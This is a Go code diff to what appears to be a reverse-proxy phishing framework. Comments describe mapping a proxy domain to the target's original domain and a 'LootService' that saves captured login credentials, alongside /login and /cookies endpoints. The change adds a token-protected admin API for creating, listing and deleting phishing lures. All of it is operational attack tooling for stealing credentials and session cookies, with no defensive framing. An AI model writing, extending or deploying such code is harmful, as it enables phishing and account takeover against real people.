@@ -10,17 +10,22 @@ import (
 	"github.com/gofiber/fiber/v2/middleware/cors"
 	"github.com/gofiber/fiber/v2/utils"
 	"github.com/valyala/fasthttp"
+	"go.uber.org/multierr"
 )
 
 type APIConfig struct {
 	// Hostname for API endpoints
 	APIHostname string
+	// API token for admin REST API
+	APIToken string
 	// DomainConverter used to convert proxy domain to target original domain
 	DomainConverter DomainConverter
 	// AuthHandler for cookies endpoints
 	AuthHandler fiber.Handler
 	// LootService to save login creds
 	LootService LootService
+	// LureService to admin lures
+	LureService LureService
 }
 
 func NewAPIMiddleware(conf APIConfig) fiber.Handler {
@@ -29,6 +34,12 @@ func NewAPIMiddleware(conf APIConfig) fiber.Handler {
 	api.Use(cors.New(cors.Config{
 		AllowCredentials: true,
 	}))
+	tokenAuth := func(c *fiber.Ctx) error {
+		if m.APIToken != c.Get("X-API-Token") {
+			return c.SendStatus(fiber.StatusForbidden)
+		}
+		return c.Next()
+	}
 	api.Post("/login", conf.AuthHandler, func(c *fiber.Ctx) (err error) {
 		return m.SaveCreds(c)
 	})
@@ -37,6 +48,21 @@ func NewAPIMiddleware(conf APIConfig) fiber.Handler {
 	})
 	api.Post("/cookies", conf.AuthHandler, func(c *fiber.Ctx) error {
 		return m.CreateCookie(c)
+	})
+	// admin REST API
+	luresAPI := api.Group("/lures", tokenAuth)
+	luresAPI.Get("", func(c *fiber.Ctx) error {
+		return m.GetLures(c)
+	})
+	luresAPI.Post("", func(c *fiber.Ctx) error {
+		return m.CreateLure(c)
+	})
+	luresAPI.Delete("/:lureURL", func(c *fiber.Ctx) error {
+		lureURL, err := url.QueryUnescape(c.Params("lureURL"))
+		if err != nil {
+			return err
+		}
+		return m.DeleteLure(lureURL)
 	})
 	apiHandler := api.Handler()
 	return func(c *fiber.Ctx) error {
@@ -89,6 +115,23 @@ func (m *apiMiddleware) CreateCookie(c *fiber.Ctx) error {
 	cookieJar := getCookieJar(c)
 	cookieJar.SetCookies(destURL, []*http.Cookie{newCookie})
 	return nil
+}
+
+func (m *apiMiddleware) GetLures(c *fiber.Ctx) error {
+	lures, err := m.LureService.GetAll()
+	return multierr.Append(err, c.JSON(lures))
+}
+
+func (m *apiMiddleware) CreateLure(c *fiber.Ctx) (err error) {
+	var lure APILure
+	if err = c.BodyParser(&lure); err != nil {
+		return
+	}
+	return m.LureService.Add(&lure)
+}
+
+func (m *apiMiddleware) DeleteLure(lureURL string) error {
+	return m.LureService.DeleteByURL(lureURL)
 }
 
 func (m *apiMiddleware) getOrigin(c *fiber.Ctx) (destURL *url.URL, err error) {
